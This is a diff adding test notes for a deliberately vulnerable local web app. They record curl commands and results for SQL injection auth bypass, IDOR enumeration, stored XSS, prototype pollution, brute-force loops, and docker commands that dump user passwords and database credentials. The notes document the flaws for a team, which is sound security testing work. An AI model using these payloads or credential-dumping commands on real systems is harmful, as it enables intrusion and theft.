@@ -221,5 +221,125 @@ Quick run plan
 
 
 
+Update, things done on Nov 17, 2025
 
+I went through the insecure endpoints and ran a full batch of tests for the team to document how everything behaves when it’s intentionally left vulnerable. We only looked at the insecure versions since the secure implementation lives in the other repo. This set is just me showing exactly what happened, what each command did, and why it matters.
+
+SQL Injection (Auth Bypass)
+
+Insecure
+curl -i -X POST "http://localhost:8000/api/auth/insecure/login
+" -H "Content-Type: application/json" --data-raw '{"username":"x' OR '1'='1'--","password":"whatever"}'
+
+What happened: Logged me in as the first user in the database even though the password was wrong.
+Meaning: Query is fully injectable because it’s built with string concatenation.
+
+IDOR (account exposures)
+
+Insecure
+curl -i "http://localhost:8000/api/accounts/insecure/1
+"
+
+What happened: Returned full account data with zero authentication. Changing the ID gives me other people’s accounts without any pushback.
+Meaning: There’s no ownership check at all. Anyone can enumerate accounts.
+
+Password exposure (insecure listing)
+
+Insecure
+curl -s "http://localhost:8000/api/auth/insecure/users
+" | jq .
+
+What happened: Returned the password or hash for every user. Some were bcrypt, others were plaintext depending on how they were created.
+Meaning: Direct data leak. Nothing is masked or protected.
+
+Plaintext password storage
+
+Insecure
+curl -s -X POST "http://localhost:8000/api/auth/insecure/register
+" -H "Content-Type: application/json" --data '{"name":"demo_pw","email":"demo_pw@example.local
+","username":"demo_pw","password":"secretpw"}'
+
+What happened: The response literally echoes the password back to me.
+Meaning: Passwords aren’t hashed. They’re stored and returned exactly as given.
+
+Login with credentials in the URL
+
+Insecure
+curl "http://localhost:8000/api/auth/insecure/login?email=demo_pw@example.local&password=secretpw
+"
+
+What happened: Login worked, but the password is sitting right in the URL.
+Meaning: This exposes credentials in history, logs, referrers — everywhere.
+
+Stored Cross-Site Scripting (XSS)
+
+Insecure
+curl -s -X POST "http://localhost:8000/api/auth/insecure/register
+" -H "Content-Type: application/json" --data '{"name":"<script>alert(XSS)</script>","email":"xss@example.local
+","username":"xss","password":"PwD!1234"}'
+
+What happened: The script tag is saved directly into the database and returned exactly as written.
+Meaning: Any frontend that renders it will execute attacker-controlled JS.
+
+Insecure Deserialization (Prototype Pollution)
+
+Insecure
+curl -s -X POST "http://localhost:8000/api/auth/insecure/deserialize
+" -H "Content-Type: application/json" --data '{"proto": {"isAdmin": true}}'
+
+What happened: Server accepted it and merged "proto" into objects.
+Meaning: Global prototype modification. Can break logic or escalate privileges.
+
+Missing session token
+
+Insecure
+curl -s -X POST http://localhost:8000/api/auth/insecure/login
+ -H "Content-Type: application/json" --data '{"username":"demo_pw","password":"secretpw"}'
+
+What happened: Login works but no session, no token, nothing to maintain state.
+Meaning: The server can’t tell users apart. Impersonation is trivial.
+
+Brute force allowed
+
+Insecure
+for i in {1..10}; do curl -s -X POST http://localhost:8000/api/auth/insecure/login
+ -H "Content-Type: application/json" --data '{"username":"demo_pw","password":"wrong"}' > /dev/null; done
+
+What happened: It accepted all attempts with no rate limit, no lockout, no alerts.
+Meaning: Someone could brute force millions of guesses easily.
+
+CORS wide open
+
+Insecure
+curl -i "http://localhost:8000/api/accounts/insecure/1
+"
+
+What happened: The insecure endpoint returns Access-Control-Allow-Origin: *
+Meaning: Any site can hit this API through a user’s browser.
+
+Weak logging
+
+Insecure
+curl -X POST http://localhost:8000/api/auth/insecure/login
+ -H "Content-Type: application/json" --data '{"username":"admin","password":"wrong"}'
+docker logs bluepeak-api | tail -5
+
+What happened: Only basic route + status are logged. No IPs, no failed attempt tracking.
+Meaning: Attacks blend in with normal traffic.
+
+Direct database dump
+
+Insecure
+docker exec -it bluepeak-db psql -U user123 -d db123 -c "SELECT userid, name, email, password FROM users;"
+
+What happened: Full user list, including plaintext passwords and stored XSS payloads.
+Meaning: Nothing is encrypted or hashed. Total compromise if DB access is gained.
+
+DB credentials exposed
+
+Insecure
+docker exec -it bluepeak-db env | grep POSTGRES
+
+What happened: Printed the DB username, password, and database name right in the environment.
+Meaning: Anyone with container or host access gets full DB credentials instantly.
 
